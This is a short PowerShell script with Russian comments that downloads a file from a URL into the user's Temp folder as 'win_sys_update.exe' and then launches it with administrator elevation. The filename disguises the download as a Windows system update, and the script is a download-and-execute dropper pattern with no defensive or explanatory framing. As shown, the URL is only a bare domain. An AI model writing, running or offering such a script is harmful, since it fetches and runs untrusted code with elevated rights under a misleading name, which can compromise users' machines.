$url = "https://github.com"
$path = "$env:LOCALAPPDATA\Temp\win_sys_update.exe"

# Скачивание файла
Invoke-WebRequest -Uri $url -OutFile $path

# Запуск от имени администратора
Start-Process -FilePath $path -Verb RunAs
